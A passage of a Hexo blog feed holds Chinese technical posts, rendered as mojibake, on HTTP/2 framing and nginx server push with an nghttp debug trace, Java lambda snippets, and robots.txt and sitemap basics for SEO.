        <content type="html"><![CDATA[<h2 id="HTTP2"><a href="#HTTP2" class="headerlink" title="HTTP2"></a>HTTP2</h2><p>é‡è¦æ¦‚å¿µï¼š</p><ul><li><p>æµ</p><p>  æµæ˜¯è¿æ¥ä¸­çš„ä¸€ä¸ªè™šæ‹Ÿä¿¡é“ï¼Œå¯ä»¥æ‰¿è½½åŒå‘çš„æ¶ˆæ¯ã€‚å¯ä»¥è®¤ä¸ºä¸€ä¸ªæµä»£è¡¨ç€ä¸€ä¸ªè¯·æ±‚-å“åº”çš„æ•°æ®ã€‚</p></li><li><p>æ¶ˆæ¯</p><p>  ä¸é€»è¾‘æ¶ˆæ¯å¯¹åº”çš„å®Œæ•´çš„ä¸€ç³»åˆ—æ•°æ®å¸§ã€‚</p></li><li><p>å¸§</p><p>  HTTP 2.0 é€šä¿¡çš„æœ€å°å•ä½ï¼Œæ¯ä¸ªå¸§åŒ…å«å¸§é¦–éƒ¨ï¼Œè‡³å°‘ä¹Ÿä¼šæ ‡è¯†å‡ºå½“å‰å¸§æ‰€å±çš„æµã€‚</p></li></ul><h3 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h3><p>å“åº”å¤´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Link: &lt;/css/styles.css&gt;; rel=preload; as=style, &lt;/js/main.js;&gt;; rel=preload; as=script</span><br></pre></td></tr></table></figure><p>nginx &gt; 1.13.9 &amp; <strong><a href="https://www.openssl.org/source/">æœ€æ–°ç‰ˆopenssl</a></strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nginxè‡ªå·±å¤„ç†</span></span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">http2_push</span> /css/style.css;</span><br><span class="line">    <span class="attribute">http2_push</span> /js/main.js;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åç«¯å®ç°</span></span><br><span class="line"><span class="section">location</span><span class="regexp"> ^~</span> /backend &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://upstream;</span><br><span class="line">    <span class="attribute">http2_push_preload</span> <span class="literal">on</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/http2-server-push.png"></p><blockquote><p>macOS&#x2F;10.13.4 Chrome&#x2F;66.0.3359.181 nginx&#x2F;1.13.12 ä¸­æµ‹è¯•å‘ç°æœ€å¤šæ”¯æŒ10ä¸ªServer Pushã€‚</p></blockquote><h3 id="åè®®å¸§"><a href="#åè®®å¸§" class="headerlink" title="åè®®å¸§"></a>åè®®å¸§</h3><p>å¸§çš„ç±»å‹æœ‰HEADERSå¸§ã€DATAå¸§ã€SETTINGSå¸§ã€PRIORITYå¸§ç­‰ç­‰ã€‚</p><p><img src="/images/http2-binary-framing.png"></p><p>å¸§çš„å¤´éƒ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------+</span><br><span class="line">|                 Length (24)                   |</span><br><span class="line">+---------------+---------------+---------------+</span><br><span class="line">|   Type (8)    |   Flags (8)   |</span><br><span class="line">+-+-------------+---------------+-------------------------------+</span><br><span class="line">|R|                 Stream Identifier (31)                      |</span><br><span class="line">+=+=============================================================+</span><br><span class="line">|                   Frame Payload (0...)                      ...</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure><ul><li><p>Lengthï¼š 24 bits</p><p>  å¸§çš„è½½è·ï¼ˆä¸åŒ…æ‹¬å¤´éƒ¨çš„9 bytesï¼‰ã€‚é™¤é<code>SETTINGS_MAX_FRAME_SIZE</code>è®¾ç½®æœ‰æ›´å¤§å€¼ï¼Œå¦åˆ™ä¸èƒ½å¤§äº2^14ï¼ˆ16,384ï¼‰16kbã€‚</p></li><li><p>Typeï¼š 8 bits</p><p>  å¸§ç±»å‹ï¼ŒæœªçŸ¥ç±»å‹ä¼šè¢«ä¸¢å¼ƒã€‚</p></li><li><p>Flagsï¼š8 bits</p><p>  å…·ä½“å¸§çš„æ ‡è¯†ï¼Œé»˜è®¤å€¼0x00ã€‚ï¼ˆæŸ¥çœ‹åé¢ä¾‹å­ä¸­çš„SETTINGSå¸§çš„flagsï¼‰</p></li><li><p>Rï¼š1 bits</p><p>  é¢„ç•™ã€‚</p></li><li><p>Stream Identifierï¼š31 bits</p><p>  æµIDã€‚</p></li></ul><p>ä½¿ç”¨<a href="https://nghttp2.org/">nghttp</a>è°ƒè¯•ï¼š</p><blockquote><p>æœ¬ä¾‹ä¸­æˆ‘ä»¬æœåŠ¡å™¨ç«¯ä¼šä½¿ç”¨ServerPUSHæ¨é€<code>/css/index.css</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nghttp -nvu  https://h2.kekek.cc/</span></span><br><span class="line">[  0.012] Connected</span><br><span class="line">The negotiated protocol: h2                                                 -- åè®®å‡çº§åˆ°h2</span><br><span class="line">[  0.019] recv SETTINGS frame &lt;length=18, flags=0x00, stream_id=0&gt;          -- è®¾ç½®å¸§ æ­¤å¤„ä¸ºæœåŠ¡å™¨ç«¯çš„è®¾ç½®å‚æ•°ï¼Œç»™å®¢æˆ·ç«¯æ—¶ä½¿ç”¨ã€‚</span><br><span class="line">          (niv=3)                                                           -- è®¾ç½®å¸§è¢«åº”ç”¨äºæ•´ä¸ªè¿æ¥ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå•ç‹¬çš„æµã€‚SETTINGSå¸§çš„æµæ ‡è¯†å¿…é¡»æ˜¯0ã€‚</span><br><span class="line">          [SETTINGS_MAX_CONCURRENT_STREAMS(0x03):128]                       -- å…è®¸æ‰“å¼€æµçš„æœ€å¤§å€¼ã€‚</span><br><span class="line">          [SETTINGS_INITIAL_WINDOW_SIZE(0x04):65536]                        -- æµé‡æ§åˆ¶çš„åˆå§‹çª—å£å¤§å°ã€‚é»˜è®¤2^16-1 (65,535)å­—èŠ‚</span><br><span class="line">          [SETTINGS_MAX_FRAME_SIZE(0x05):16777215]                          -- å•å¸§æœ€å¤§å€¼ã€‚</span><br><span class="line">                                                                            -- é»˜è®¤ä¸º2^14ï¼ˆ16384ï¼‰ä¸ªå­—èŠ‚ï¼Œå€¼åŒºé—´ä¸º2^14ï¼ˆ16384ï¼‰-2^24-1(16777215)ã€‚ </span><br><span class="line">[  0.019] recv WINDOW_UPDATE frame &lt;length=4, flags=0x00, stream_id=0&gt;      -- æµé‡æ§åˆ¶å¸§ï¼Œä½œç”¨äºå•ä¸ªæµä»¥åŠæ•´ä¸ªè¿æ¥ï¼Œä½†åªèƒ½å½±å“ä¸¤ä¸ªç«¯ç‚¹ä¹‹é—´ä¼ è¾“çš„DATAæ•°æ®å¸§ã€‚</span><br><span class="line">          (window_size_increment=2147418112)                                -- æµæ ‡è¯†ç¬¦ä¸º0ï¼Œå½±å“æ•´ä¸ªè¿æ¥ï¼Œéå•ä¸ªæµã€‚</span><br><span class="line">[  0.019] send SETTINGS frame &lt;length=12, flags=0x00, stream_id=0&gt;          -- è®¾ç½®å¸§ æ­¤å¤„ä¸ºå®¢æˆ·ç«¯çš„è®¾ç½®å‚æ•°ï¼Œç»™æœåŠ¡å™¨ä½¿ç”¨ã€‚</span><br><span class="line">          (niv=2)</span><br><span class="line">          [SETTINGS_MAX_CONCURRENT_STREAMS(0x03):100]</span><br><span class="line">          [SETTINGS_INITIAL_WINDOW_SIZE(0x04):65535]</span><br><span class="line">[  0.019] send SETTINGS frame &lt;length=0, flags=0x01, stream_id=0&gt;           -- ACK (0x1)ï¼šè®¾ç½®è¿™ä¸ªæ ‡å¿—ä½è¡¨æ˜å½“å‰å¸§ç¡®è®¤æ¥æ”¶å’Œåº”ç”¨äº†å¯¹ç«¯çš„SETTINGSå¸§ã€‚</span><br><span class="line">          ; ACK</span><br><span class="line">          (niv=0)</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=3&gt;            -- ä¼˜å…ˆçº§å¸§ stream_idä¸º0x00æ—¶è¿”å›PROTOCOL_ERRORã€‚</span><br><span class="line">          (dep_stream_id=0, weight=201, exclusive=0)                         -- dep_stream_id ä¾èµ–çš„æµ  weight æƒé‡</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=5&gt;</span><br><span class="line">          (dep_stream_id=0, weight=101, exclusive=0)</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=7&gt;</span><br><span class="line">          (dep_stream_id=0, weight=1, exclusive=0)</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=9&gt;</span><br><span class="line">          (dep_stream_id=7, weight=1, exclusive=0)</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=11&gt;</span><br><span class="line">          (dep_stream_id=3, weight=1, exclusive=0)</span><br><span class="line">[  0.019] send HEADERS frame &lt;length=43, flags=0x25, stream_id=13&gt;           -- æŠ¥å¤´å¸§ è¯·æ±‚å¤´æˆ–å“åº”å¤´ï¼ŒåŒæ—¶ä¹Ÿç”¨äºæ‰“å¼€ä¸€ä¸ªæµã€‚</span><br><span class="line">          ; END_STREAM | END_HEADERS | PRIORITY       </span><br><span class="line">          (padlen=0, dep_stream_id=11, weight=16, exclusive=0)</span><br><span class="line">          ; Open new stream</span><br><span class="line">          :method: GET</span><br><span class="line">          :path: /</span><br><span class="line">          :scheme: https</span><br><span class="line">          :authority: h2.kekek.cc</span><br><span class="line">          accept: */*</span><br><span class="line">          accept-encoding: gzip, deflate</span><br><span class="line">          user-agent: nghttp2/1.32.0</span><br><span class="line">[  0.020] recv SETTINGS frame &lt;length=0, flags=0x01, stream_id=0&gt;</span><br><span class="line">          ; ACK</span><br><span class="line">          (niv=0)</span><br><span class="line">[  0.020] recv (stream_id=13) :method: GET</span><br><span class="line">[  0.021] recv (stream_id=13) :path: /css/index.css</span><br><span class="line">[  0.021] recv (stream_id=13) :scheme: https</span><br><span class="line">[  0.021] recv (stream_id=13) :authority: h2.kekek.cc</span><br><span class="line">[  0.021] recv (stream_id=13) accept-encoding: gzip, deflate</span><br><span class="line">[  0.021] recv (stream_id=13) user-agent: nghttp2/1.32.0</span><br><span class="line">[  0.021] recv PUSH_PROMISE frame &lt;length=71, flags=0x04, stream_id=13&gt;       -- æ‰¿è¯ºæ¨é€å¸§</span><br><span class="line">          ; END_HEADERS</span><br><span class="line">          (padlen=0, promised_stream_id=2)</span><br><span class="line">[  0.021] recv (stream_id=13) :status: 200</span><br><span class="line">[  0.021] recv (stream_id=13) server: nginx/1.13.12</span><br><span class="line">[  0.021] recv (stream_id=13) date: Thu, 31 May 2018 06:17:14 GMT</span><br><span class="line">[  0.021] recv (stream_id=13) content-type: text/html</span><br><span class="line">[  0.021] recv (stream_id=13) last-modified: Thu, 24 May 2018 07:28:34 GMT</span><br><span class="line">[  0.021] recv (stream_id=13) etag: W/&quot;5b0669a2-67c&quot;</span><br><span class="line">[  0.021] recv (stream_id=13) content-encoding: gzip</span><br><span class="line">[  0.021] recv HEADERS frame &lt;length=107, flags=0x04, stream_id=13&gt;</span><br><span class="line">          ; END_HEADERS</span><br><span class="line">          (padlen=0)</span><br><span class="line">          ; First response header</span><br><span class="line">[  0.021] recv DATA frame &lt;length=638, flags=0x01, stream_id=13&gt;              -- DATA æ•°æ®å¸§ï¼Œç”¨æ¥æºå¸¦HTTPè¯·æ±‚æˆ–å“åº”</span><br><span class="line">          ; END_STREAM                                                        -- END_STREAM 0x01ç”¨æ¥è¡¨ç¤ºå½“å‰å¸§æ˜¯å½“å‰æµçš„æœ€åä¸€å¸§</span><br><span class="line">[  0.021] recv (stream_id=2) :status: 200</span><br><span class="line">[  0.021] recv (stream_id=2) server: nginx/1.13.12</span><br><span class="line">[  0.021] recv (stream_id=2) date: Thu, 31 May 2018 06:17:14 GMT</span><br><span class="line">[  0.021] recv (stream_id=2) content-type: text/css</span><br><span class="line">[  0.021] recv (stream_id=2) last-modified: Thu, 24 May 2018 07:28:32 GMT</span><br><span class="line">[  0.021] recv (stream_id=2) etag: W/&quot;5b0669a0-1bcd&quot;</span><br><span class="line">[  0.021] recv (stream_id=2) content-encoding: gzip</span><br><span class="line">[  0.021] recv HEADERS frame &lt;length=106, flags=0x04, stream_id=2&gt;</span><br><span class="line">          ; END_HEADERS</span><br><span class="line">          (padlen=0)</span><br><span class="line">          ; First push response header</span><br><span class="line">[  0.021] recv DATA frame &lt;length=1857, flags=0x01, stream_id=2&gt;</span><br><span class="line">          ; END_STREAM</span><br><span class="line">[  0.021] send GOAWAY frame &lt;length=8, flags=0x00, stream_id=0&gt;</span><br><span class="line">          (last_stream_id=2, error_code=NO_ERROR(0x00), opaque_data(0)=[])</span><br></pre></td></tr></table></figure><h3 id="å¤šè·¯å¤ç”¨"><a href="#å¤šè·¯å¤ç”¨" class="headerlink" title="å¤šè·¯å¤ç”¨"></a>å¤šè·¯å¤ç”¨</h3><p>HTTP1.xä¸€ä¸ªè¿æ¥åªèƒ½å¤„ç†ä¸€ä¸ªè¯·æ±‚ï¼Œå¼€å¯<code>keep-alive</code>åå¯ä»¥å¤ç”¨è¿æ¥ï¼ˆå‰ä¸€ä¸ªå¤„ç†å®Œåå¤ç”¨ï¼‰ï¼ŒHTTP2å¯ä»¥ä¸€ä¸ªè¿æ¥åŒæ—¶å¤„ç†å¤šä¸ªè¯·æ±‚å“åº”ã€‚å¯¹äºæ¯ä¸ªåŸŸåæµè§ˆå™¨æ‰“å¼€ä¸€ä¸ªè¿æ¥å°±èƒ½åŒæ—¶å¤„ç†å¤šä¸ªè¯·æ±‚å“åº”ï¼Œè¿™å°†çªç ´http&#x2F;1.1åè®®ä¸‹æµè§ˆå™¨å¯¹äºåŒä¸€ä¸ªåŸŸåæœ€å¤§è¿æ¥æ•°çš„é™åˆ¶ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¯ä»¥å°† HTTP æ¶ˆæ¯åˆ†è§£ä¸ºäº’ä¸ä¾èµ–çš„å¸§ï¼Œç„¶åäº¤é”™å‘é€ï¼Œæœ€åå†åœ¨å¦ä¸€ç«¯æŠŠå®ƒä»¬é‡æ–°ç»„è£…èµ·æ¥ã€‚</p><p><img src="/images/http2-multiplexing.png"></p><p>ä¸‹é¢æˆ‘ä»¬åšä¸€ä¸ªæµ‹è¯•ï¼Œåœ¨<code>http/1.1</code>æ¨¡å¼å’Œ<code>http2</code>åè®®ä¸‹åˆ†åˆ«è®¿é—®ä¸‹é¢é¡µé¢ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img.png?_=1&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img_1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img.png?_=2&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img_2&quot;</span> <span class="attr">width</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">&lt;!-- å…±åŠ è½½100å¼ å›¾ç‰‡ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img.png?_=100&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img_100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŸ¥çœ‹æœåŠ¡å™¨è¿æ¥ï¼Œå¯ä»¥çœ‹åˆ°443ç«¯å£ï¼ˆhttp2ï¼‰åªæœ‰1ä¸ªè¿æ¥ï¼Œè€Œ80ç«¯å£ï¼ˆhttp&#x2F;1.1ï¼‰æœ‰6ï¼ˆChromeä¸‹ï¼‰ä¸ªè¿æ¥ã€‚</p><p><img src="/images/http2-connections.png"></p><blockquote><p>æµ‹è¯•æ—¶å‘ç°http&#x2F;1.1ä¸‹å¤šä¸ªè¿æ¥æ¯”http2çš„å¤šè·¯å¤ç”¨æ›´ç¨³å®šï¼Œhttp2æµ‹è¯•è¿‡ç¨‹ä¸­æ²¡æœ‰èƒ½åŠ è½½å‡ºæ¥100å¼ å…¨éƒ¨å›¾ç‰‡ã€‚</p></blockquote><p>** HTTP1.1 vs HTTP2 **<br><img src="/images/http1vshttp2.jpg"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://imququ.com/post/http2-resource.html">HTTP&#x2F;2 èµ„æ–™æ±‡æ€»</a></li><li><a href="https://www.phpsong.com/2818.html">nginxé…ç½®http2æ— æ•ˆä¸èµ·ä½œç”¨</a></li><li><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn">HTTP&#x2F;2 ç®€ä»‹</a></li><li><a href="https://github.com/creeperyang/blog/issues/23">HTTP2ç®€ä»‹å’ŒåŸºäºHTTP2çš„Webä¼˜åŒ–</a></li><li><a href="https://w3ctech.com/topic/862">å€ŸåŠ© HTTP&#x2F;2 æ‰“é€ æ›´è¿…æ·çš„ Web ä½“éªŒ</a></li><li><a href="http://www.cnblogs.com/etoah/p/5891285.html">HTTP2ç‰¹æ€§é¢„è§ˆå’ŒæŠ“åŒ…åˆ†æ</a></li><li><a href="https://www.nihaoshijie.com.cn/index.php/archives/698/">HTTP2.0å…³äºå¤šè·¯å¤ç”¨çš„ç ”ç©¶</a></li><li><a href="https://httpwg.org/specs/rfc7540.html">Hypertext Transfer Protocol Version 2 (HTTP&#x2F;2)</a></li><li><a href="https://book.douban.com/subject/25856314/">Webæ€§èƒ½æƒå¨æŒ‡å—</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> http2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exception</title>
      <link href="/post/exception.html"/>
      <url>/post/exception.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h3><p>ä¸åŒè¯­è¨€çš„å¼‚å¸¸</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java Lambda</title>
      <link href="/post/java-lambda.html"/>
      <url>/post/java-lambda.html</url>
      
        <content type="html"><![CDATA[<h2 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h2><p><img src="/images/Java+Lambda.png"><br>&lt;<a href="http://naotu.baidu.com/file/6f48a8bf61f964bd63b986bdb83c2e79?token=11d0ce93b785bbf2">http://naotu.baidu.com/file/6f48a8bf61f964bd63b986bdb83c2e79?token=11d0ce93b785bbf2</a>&gt;</p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>å•è¯è½¬å¤§å†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sentence</span> <span class="operator">=</span> <span class="string">&quot;Start Using Java Lambda Expressions&quot;</span>;</span><br><span class="line">List&lt;String&gt; words = Arrays.stream(sentence.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">                .map(String::toUpperCase)</span><br><span class="line">                .collect(toList());</span><br></pre></td></tr></table></figure><p>è·å–å­—ç¬¦ä¸²çš„å•è¯é•¿åº¦å’Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sentence</span> <span class="operator">=</span> <span class="string">&quot;Start Using Java Lambda Expressions&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> Arrays.stream(sentence.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">                .map(String::length)</span><br><span class="line">                .reduce(<span class="number">0</span>, Integer::sum)</span><br><span class="line">                .intValue();;</span><br></pre></td></tr></table></figure><p>å¥‡å¶æ•°åˆ†ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Boolean, List&lt;Integer&gt;&gt; res = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>).stream().collect(partitioningBy(i -&gt; (i % <span class="number">2</span> == <span class="number">0</span>)));</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] args = ...;</span><br><span class="line">Arrays.stream(args).map(String::valueOf).collect(Collectors.joining(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seo</title>
      <link href="/post/seo.html"/>
      <url>/post/seo.html</url>
      
        <content type="html"><![CDATA[<h2 id="SEO"><a href="#SEO" class="headerlink" title="SEO"></a>SEO</h2><h3 id="Robots"><a href="#Robots" class="headerlink" title="Robots"></a>Robots</h3><p>çˆ¬è™«åè®®ã€‚è§„å®šä¸ºå°å†™çš„<code>robots.txt</code>ï¼Œæ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ã€‚ç”¨äºå‘Šè¯‰çˆ¬è™«æ­¤ç½‘ç«™ä¸­çš„å“ªäº›å†…å®¹æ˜¯ä¸åº”è¢«æœç´¢å¼•æ“çš„çˆ¬è™«è·å–çš„ï¼Œå“ªäº›æ˜¯å¯ä»¥è¢«çˆ¬è™«è·å–çš„ã€‚</p><p><code>Robots</code>ä¸»è¦åŒ…å«ä»¥ä¸‹å‡ å¤§éƒ¨åˆ†</p><ul><li><p>User-agent</p><p>  å¯¹ç‰¹å®šæœºå™¨äººè¿›è¡Œé…ç½®ã€‚å¸¸è§çš„æœ‰<code>Baiduspider</code>ã€<code>Googlebot</code>ã€<code>Bingbot</code>ã€<code>360Spider</code>ã€<code>Sogouspider</code>ã€‚å¯ä»¥è®¾ç½®ä¸º<code>*</code>ä»£è¡¨æ‰€æœ‰ã€‚<a href="https://www.taobao.com/robots.txt">æ·˜å®</a>ã€<a href="https://www.oschina.net/robots.txt">OSChina</a></p></li><li><p>Disallow</p><p>  æŒ‡å®šé‚£äº›ç›®å½•ä¸‹æ˜¯ä¸å¯ä»¥è¢«æŠ“å–çš„ã€‚</p></li><li><p>Allow </p><p>  æŒ‡å®šé‚£äº›ç›®å½•ä¸‹æ˜¯å¯ä»¥è¢«æŠ“å–çš„ã€‚</p><blockquote><p>ä¸€äº›çˆ¬è™«æ”¯æŒä¸€é¡¹AllowæŒ‡ä»¤ï¼Œå¯ä»¥å…ˆå†™å¤šä¸ªDisallowæœ€åå†™AllowæŒ‡ä»¤ã€‚</p></blockquote></li><li><p>Sitemap </p><p>  ç«™ç‚¹åœ°å›¾ã€‚æ–¹ä¾¿çˆ¬è™«è¿›è¡ŒæŠ“å–ï¼Œé‡Œé¢æ˜¯ç«™å†…ç½‘ç«™çš„åœ°å€ã€‚</p></li><li><p>Crawl-delay</p><p>  æŠ“å–é—´éš”ã€‚<code>Crawl-delay: 10</code>æŒ‡åœ¨çˆ¬è™«ä¸¤æ¬¡è¿›å…¥ç«™ç‚¹æ—¶é—´éš”ä¸º<code>10</code>ç§’ã€‚<em>éƒ¨åˆ†æœç´¢å¼•æ“ä¼šå¿½ç•¥</em></p></li></ul><p>æœ¬ç«™çš„<code>robots.txt</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /search</span><br><span class="line">Allow: /</span><br><span class="line">Sitemap: https://kekek.cc/sitemap.xml</span><br></pre></td></tr></table></figure><p>æ¬¡è§„åˆ™é€‚ç”¨äºæ‰€æœ‰çˆ¬è™«ï¼Œ<code>/search</code>ä¸‹çš„å†…å®¹ä¸å¯ä»¥è¢«æŠ“å»ï¼Œå…¶å®ƒæ‰€æœ‰ç½‘å€éƒ½å¯ä»¥è¢«æŠ“å»ã€‚ç«™ç‚¹åœ°å›¾åœ°å€ä¸º<code>https://kekek.cc/sitemap.xml</code>ã€‚</p><h3 id="sitemap"><a href="#sitemap" class="headerlink" title="sitemap"></a>sitemap</h3><p>ç«™ç‚¹åœ°å›¾ã€‚ä¸»è¦ä¸ºxmlæ ¼å¼ï¼Œé‡Œé¢åŒ…å«ç«™å†…ç½‘é¡µçš„è¿æ¥ã€‚</p><p>ä¸»è¦å±æ€§ï¼š</p><ul><li><p>lastmod</p><p>  é¡µé¢æœ€åä¿®æ”¹æ—¶é—´</p></li><li><p>loc </p><p>  é¡µé¢æ°¸ä¹…é“¾æ¥åœ°å€</p></li><li><p>priority</p><p>  ç›¸å¯¹äºå…¶ä»–é¡µé¢çš„ä¼˜å…ˆæƒ</p></li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">urlset</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>https://kekek.cc/baidu_verify_V1VRvzkxVm.html<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastmod</span>&gt;</span>2018-05-04T10:38:47.003Z<span class="tag">&lt;/<span 